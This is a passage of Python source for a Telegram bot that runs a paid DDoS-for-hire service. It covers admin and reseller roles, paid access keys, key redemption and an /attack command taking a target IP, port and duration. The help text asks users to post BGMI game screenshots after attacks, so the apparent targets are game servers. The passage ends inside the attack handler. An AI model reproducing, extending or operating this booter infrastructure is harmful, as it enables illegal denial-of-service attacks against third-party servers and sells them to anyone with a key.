    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /removeadmin <username_or_id>\n"
            f"*Example*: /removeadmin @user123 ya /removeadmin 123456789 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ OVERLORD ALERT ⚡️*\n\n"
                f"*STATUS*: Overlord ko remove nahi kar sakte! 🚫\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        if target_username not in admin_usernames:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ NOT ADMIN ⚡️*\n\n"
                f"*STATUS*: {target} admin nahi hai! ❌\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        admin_usernames.remove(target_username)
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ADMIN REMOVED ⚡️*\n\n"
            f"*STATUS*: Admin remove ho gaya! 🗑️\n"
            f"*Username*: {target}\n\n"
            f"*COSMIC COMMAND*: /checkadmin dekh list! ✅\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = (
                    f"~~~ NEON GATEWAY ~~~ 🌌\n"
                    f"*⚡️ OVERLORD ALERT ⚡️*\n\n"
                    f"*STATUS*: Overlord ko remove nahi kar sakte! 🚫\n"
                    f"~~~ NEON EXIT ~~~"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            if target_id not in admin_id:
                response = (
                    f"~~~ NEON GATEWAY ~~~ 🌌\n"
                    f"*⚡️ NOT ADMIN ⚡️*\n\n"
                    f"*STATUS*: User ID {target_id} admin nahi hai! ❌\n"
                    f"~~~ NEON EXIT ~~~"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            admin_id.remove(target_id)
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ ADMIN REMOVED ⚡️*\n\n"
                f"*STATUS*: Admin remove ho gaya! 🗑️\n"
                f"*User ID*: {target_id}\n\n"
                f"*COSMIC COMMAND*: /checkadmin dekh list! ✅\n"
                f"~~~ NEON EXIT ~~~"
            )
        except ValueError:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye. ❌\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removeadmin", f"Target: {target}", response)

@bot.message_handler(commands=['checkadmin'])
def check_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["checkadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ COSMIC LEADERS ⚡️*\n\n"
        f"*OVERLORDS:*\n"
    )
    for oid in overlord_id:
        try:
            user_info = bot.get_chat(oid)
            user_name = user_info.username if user_info.username else user_info.first_name
            response += f"👤 *User ID*: {oid}\n🎭 *Username*: @{user_name}\n👑 *Role*: Overlord\n\n"
        except:
            response += f"👤 *User ID*: {oid}\n🎭 *Username*: Unknown\n👑 *Role*: Overlord\n\n"
    for uname in overlord_usernames:
        response += f"🎭 *Username*: {uname}\n👤 *User ID*: Unknown\n👑 *Role*: Overlord\n\n"
    response += "*ADMINS:*\n"
    if not admin_id and not admin_usernames:
        response += "Koi additional admins nahi hai.\n"
    else:
        for aid in admin_id:
            if aid not in overlord_id:
                try:
                    user_info = bot.get_chat(aid)
                    user_name = user_info.username if user_info.username else user_info.first_name
                    response += f"👤 *User ID*: {aid}\n🎭 *Username*: @{user_name}\n✅ *Role*: Admin\n\n"
                except:
                    response += f"👤 *User ID*: {aid}\n🎭 *Username*: Unknown\n✅ *Role*: Admin\n\n"
        for uname in admin_usernames:
            if uname not in overlord_usernames:
                response += f"🎭 *Username*: {uname}\n👤 *User ID*: Unknown\n✅ *Role*: Admin\n\n"
    response += (
        f"*COSMIC INSIGHT*: Yeh log bot ke bosses hai, inka hukum sar aankhon pe! 💥\n\n"
        f"*COSMIC COMMAND*: /myinfo dekh apna status! 🚀\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkadmin", "", response)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addreseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if user_id not in admin_id and not is_overlord(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ya overlord ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /addreseller <user_id> <balance>\n"
            f"*Example*: /addreseller 123456789 1000 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    try:
        initial_balance = int(command_parts[2])
        if initial_balance < 0:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Balance negative nahi ho sakta! ❌\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addreseller", f"Command: {command}", response)
            return
    except ValueError:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Invalid balance amount! Number daal, bhai! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        # Martha Stewart would approve of this organized approach to managing resellers! 😄 Let's keep the cosmic chaos in check!
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_data()
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ RESELLER ADDED ⚡️*\n\n"
            f"*STATUS*: Reseller add ho gaya! 🎉\n"
            f"👤 *Reseller ID*: {reseller_id}\n"
            f"💰 *Balance*: {initial_balance} Rs\n\n"
            f"*COSMIC COMMAND*: /resellers dekh list! ✅\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ALREADY RESELLER ⚡️*\n\n"
            f"*STATUS*: Reseller {reseller_id} pehle se hai! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addreseller", f"Reseller ID: {reseller_id}, Balance: {initial_balance}", response)
    save_data()

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["genkey"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, admin hi key bana sakta hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    
    # Check if the user is an Overlord
    if is_overlord(user_id, username):
        if len(command_parts) < 4 or len(command_parts) > 5:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Sahi format mein daal, bhai!\n"
                f"*Usage*: /genkey <duration> [device_limit] <key_name> <context>\n"
                f"*Example*: /genkey 1d 999 sadiq group ya /genkey 1d sadiq DM 📋\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        # Parse the command for Overlord
        duration = command_parts[1].lower()
        if len(command_parts) == 5:
            device_limit_input = command_parts[2].lower()
            key_name = command_parts[3]
            context = command_parts[4].lower()
        else:
            device_limit_input = "1"  # Default to 1 if not specified
            key_name = command_parts[2]
            context = command_parts[3].lower()
        
        # Parse device limit
        if device_limit_input == "all":
            device_limit = float('inf')  # Unlimited devices
        else:
            try:
                device_limit = int(device_limit_input)
                if device_limit < 1:
                    response = (
                        f"~~~ NEON GATEWAY ~~~ 🌌\n"
                        f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                        f"*STATUS*: Device limit kam se kam 1 hona chahiye! ❌\n"
                        f"~~~ NEON EXIT ~~~"
                    )
                    safe_reply(bot, message, response)
                    log_action(user_id, username, "/genkey", f"Command: {command}", response)
                    return
            except ValueError:
                response = (
                    f"~~~ NEON GATEWAY ~~~ 🌌\n"
                    f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                    f"*STATUS*: Invalid device limit! Number ya 'all' daal, bhai! ❌\n"
                    f"~~~ NEON EXIT ~~~"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/genkey", f"Command: {command}", response)
                return
    else:
        # Non-Overlord (Admins and Resellers) format
        if len(command_parts) != 4 or command_parts[1].lower() != "key":
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Sahi format mein daal, bhai!\n"
                f"*Usage*: /genkey key <duration> <key_name>\n"
                f"*Example*: /genkey key 1d rahul\n"
                f"*Note*: Sirf group keys allowed! 📋\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        duration = command_parts[2].lower()
        key_name = command_parts[3]
        context = 'group'  # Fixed to group for Admins/Resellers
        device_limit = 1  # Default device limit for non-Overlords

    # Validate context for Overlord
    if is_overlord(user_id, username):
        if context not in ['dm', 'group', 'groups']:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Invalid context! 'dm', 'group', ya 'groups' daal, bhai! ❌\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        context = 'group' if context in ['group', 'groups'] else 'private'

    # Parse duration
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None and hours is None and days is None and months is None:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Invalid duration! Formats jaise 30min, 1h, 1d, 1m daal! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"

    custom_key = f"Rahul_sadiq-{key_name}"
    generated_by = username or f"UserID_{user_id}"
    generated_time = datetime.datetime.now(IST)
    # If key exists, update it and unblock if previously blocked
    if custom_key in keys:
        was_blocked = keys[custom_key].get("blocked", False)
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": keys[custom_key].get("devices", []),
            "blocked": False,
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": generated_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "updated"
        if was_blocked:
            log_action(user_id, username, "/genkey", f"Key: {custom_key}", f"Unblocked key {custom_key} during regeneration")
    else:
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": [],
            "blocked": False,
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": generated_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "generated"
        stats["total_keys"] += 1
        stats["key_gen_timestamps"].append(generated_time)

    save_data()

    for uid in keys[custom_key]["devices"]:
        if uid in users:
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[uid] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": context}
    save_data()

    device_limit_display = "Unlimited" if device_limit == float('inf') else device_limit
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ {random.choice(cyberpunk_quotes)} ⚡️*\n\n"
        f"*VAULT ACCESS:*\n"
        f"COPY THIS KEY: {custom_key}\n\n"
        f"*KEY BLUEPRINT:*\n"
        f"⏳ *Duration*: {duration}\n"
        f"📱 *Device Limit*: {device_limit_display}\n"
        f"🌐 *Context*: {context.capitalize()} Mein Hi Chalega\n"
        f"👤 *Generated by*: @{generated_by}\n"
        f"📅 *Generated on*: {keys[custom_key]['generated_time']}\n\n"
        f"*COPY KA JUGAAD*: Bas COPY THIS KEY wali line pe tap-hold kar, key ekdum tera! 😎\n\n"
        f"*COSMIC INSIGHT*: Yeh key tujhe galaxy ka boss banayega, par isko kisi ke saath share mat karna! 💥\n\n"
        f"*COSMIC COMMAND*: /redeem use karke is key ko activate kar! 🚀\n"
    )
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_data()
            response += (
                f"*RESELLER KA SCORE:*\n"
                f"💸 *Cost*: {cost} Rs\n"
                f"💰 *Baki Balance*: {resellers[user_id]} Rs\n"
            )
    response += f"~~~ NEON EXIT ~~~"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/genkey", f"Key: {custom_key}, Duration: {duration}, Device Limit: {device_limit_display}, Context: {context}, Generated by: @{generated_by}", response)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["help"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ COSMIC DDOS COMMAND CENTER ⚡️*\n\n"
        f"*BOT CONTROLS:*\n"
        f"🚀 */start*: Bot ko shuru kar\n"
        f"ℹ️ */myinfo*: Apna status check kar\n"
        f"📋 */help*: Yeh guide dekh\n"
        f"✅ */checkadmin*: Admins aur overlords ki list dekh\n\n"
        f"*POWER MANAGEMENT:*\n"
        f"💥 */attack <ip> <port> <time>*: Attack launch kar (admin & authorized users only)\n"
        f"  - Group: Max 210s, feedback (BGMI screenshot) compulsory\n"
        f"  - DM: Max 280s, feedback important but not compulsory\n"
        f"  - Overlords: No feedback required\n"
        f"⏳ */setcooldown <seconds>*: Attack cooldown set kar (admin only)\n"
        f"⏳ */checkcooldown*: Current cooldown dekh\n"
        f"💰 */addreseller <user_id> <balance>*: Naya reseller add kar (admin only)\n"
        f"🔑 */genkey*: Key bana (admin/reseller/overlord only)\n"
        f"  - Overlords: /genkey <duration> [device_limit] <key_name> <context> (e.g., /genkey 1d 999 sadiq group)\n"
        f"  - Admins/Resellers: /genkey key <duration> <key_name> (e.g., /genkey key 1d rahul)\n"
        f"📊 */stats*: Live bot stats dekh (overlord only)\n"
        f"📜 */logs*: Recent logs dekh (overlord only)\n"
        f"👥 */users*: Authorized users ki list dekh (admin only)\n"
        f"➕ */add <user_id>*: User ko access de (admin only)\n"
        f"➖ */remove <user_id>*: User ko hata (admin only)\n"
        f"💰 */resellers*: Resellers ki list dekh\n"
        f"💸 */addbalance <reseller_id> <amount>*: Reseller ko balance add kar (admin only)\n"
        f"🗑️ */removereseller <reseller_id>*: Reseller hata (admin only)\n"
        f"🚫 */block <key_name>*: Key block kar aur users hata (admin only)\n"
        f"➕ */addadmin <username_or_id>*: Admin add kar (overlord only)\n"
        f"➖ */removeadmin <username_or_id>*: Admin hata (overlord only)\n"
        f"🔓 */redeem <key_name>*: Key activate kar (e.g., /redeem Rahul_sadiq-rahul)\n"
        f"💰 */balance*: Apna reseller balance check kar (resellers only)\n"
        f"🔑 */listkeys*: Sari keys dekh (admin only)\n\n"
        f"*FEEDBACK*: BGMI screenshot bhejna zaroori hai attack ke baad. Duplicate screenshots nahi chalenge! 📸\n\n"
        f"*COSMIC INSIGHT*: Har command ek cosmic power hai, smartly use kar! 💥\n\n"
        f"*COSMIC COMMAND*: /start ya /myinfo try kar! 🚀\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/help", "", response)
    save_data()

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["balance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ RESELLER BALANCE ⚡️*\n\n"
            f"*STATUS*: Tera balance check kar liya, bhai!\n"
            f"💰 *Current Balance*: {current_balance} Rs\n\n"
            f"*COSMIC INSIGHT*: Balance kam hai toh @Rahul_618 se top-up karwa! 💸\n\n"
            f"*COSMIC COMMAND*: /genkey use kar keys banane ke liye! 🔑\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, tu reseller nahi hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se reseller banne ke liye baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/balance", "", response)
    save_data()

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["redeem"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'
    
    if is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ADMIN ALERT ⚡️*\n\n"
            f"*STATUS*: Bhai, admin ko key ki zarurat nahi! 😎\n\n"
            f"*COSMIC COMMAND*: /myinfo dekh apna status! ✅\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Key daal, bhai!\n"
            f"*Usage*: /redeem <key_name>\n"
            f"*Example*: /redeem Rahul_sadiq-rahul 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    key = command_parts[1].strip()
    if user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response = (
                    f"~~~ NEON GATEWAY ~~~ 🌌\n"
                    f"*⚡️ ACTIVE KEY ALERT ⚡️*\n\n"
                    f"*STATUS*: Tera pehle se ek active key hai! 🔑\n"
                    f"🌐 *Context*: {user_info['context'].capitalize()} Mein Hi Chalega\n"
                    f"⏳ *Expires on*: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n\n"
                    f"*COSMIC INSIGHT*: Pehle wala key khatam hone de, fir naya redeem kar! ⏳\n"
                    f"~~~ NEON EXIT ~~~"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/redeem", f"Key: {key}", response)
                return
            else:
                del users[user_id]
                save_data()
                log_action(user_id, username, "/redeem", f"Removed expired user access for UserID: {user_id}", "User access removed due to expiration")
        except (ValueError, KeyError):
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ SYSTEM ERROR ⚡️*\n\n"
                f"*STATUS*: User data mein gadbad hai! 😢\n"
                f"*COSMIC COMMAND*: @Rahul_618 ko bol, issue fix karenge! 📩\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response, "Invalid user data")
            return
    if key in keys:
        if keys[key].get("blocked", False):
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ KEY BLOCKED ⚡️*\n\n"
                f"*STATUS*: Yeh key block ho chuka hai! 🚫\n\n"
                f"*COSMIC COMMAND*: @Rahul_618 se nayi key le! 🔑\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if keys[key]["context"] != chat_type:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ WRONG CONTEXT ⚡️*\n\n"
                f"*STATUS*: Yeh key {keys[key]['context'].capitalize()} mein hi kaam karega!\n\n"
                f"*COSMIC COMMAND*: Sahi context mein try kar ya @Rahul_618 se baat kar! 📩\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}, Context: {chat_type}", response)
            return
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ DEVICE LIMIT REACHED ⚡️*\n\n"
                f"*STATUS*: Is key ka device limit khatam ho gaya! 🚫\n"
                f"*Limit*: {keys[key]['device_limit']}\n\n"
                f"*COSMIC COMMAND*: @Rahul_618 se nayi key le! 🔑\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        generated_time = datetime.datetime.strptime(keys[key]["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        minutes, hours, days, months = parse_duration(keys[key]["duration"])
        expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
        if datetime.datetime.now(IST) > expiration_time:
            del keys[key]
            stats["expired_keys"] += 1
            save_data()
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ KEY EXPIRED ⚡️*\n\n"
                f"*STATUS*: Yeh key expire ho chuka hai! ⏳\n\n"
                f"*COSMIC COMMAND*: @Rahul_618 se nayi key le! 🔑\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        keys[key]["devices"].append(user_id)
        users[user_id] = {
            "expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "context": chat_type
        }
        stats["redeemed_keys"] += 1
        save_data()
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ KEY REDEEMED ⚡️*\n\n"
            f"*STATUS*: Key activate ho gaya, bhai! 🎉\n"
            f"🔑 *Key*: {key}\n"
            f"⏳ *Expires on*: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
            f"🌐 *Context*: {chat_type.capitalize()} Mein Hi Chalega\n\n"
            f"*COSMIC INSIGHT*: Ab tu cosmic power ka hissa hai! Attack ke liye /attack use kar! 💥\n"
            f"*FEEDBACK ZAROORI*: Group mein attack ke baad BGMI screenshot bhejna compulsory hai! 📸\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ INVALID KEY ⚡️*\n\n"
            f"*STATUS*: Yeh key exist nahi karta! ❌\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se valid key le! 🔑\n"
            f"~~~ NEON EXIT ~~~"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/redeem", f"Key: {key}", response)

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["attack"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username) and not has_valid_context(user_id, chat_type):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, tujhe attack ka access nahi hai! 🚫\n\n"
            f"*COSMIC COMMAND*: /redeem <key> use kar ya @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /attack <ip> <port> <time>\n"
            f"*Example*: /attack 192.168.1.1 80 60 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    target = command_parts[1]
    try:
        port = int(command_parts[2])
        time_duration = int(command_parts[3])
    except ValueError:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Port aur time number hone chahiye! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    if not (1 <= port <= 65535):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Port 1 se 65535 ke beech hona chahiye! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    max_time = 280 if chat_type == 'private' else 210
    if is_overlord(user_id, username):
        max_time = float('inf')  # No time limit for overlords
    if time_duration < 1 or time_duration > max_time:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Time 1 se {max_time} seconds ke beech hona chahiye! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
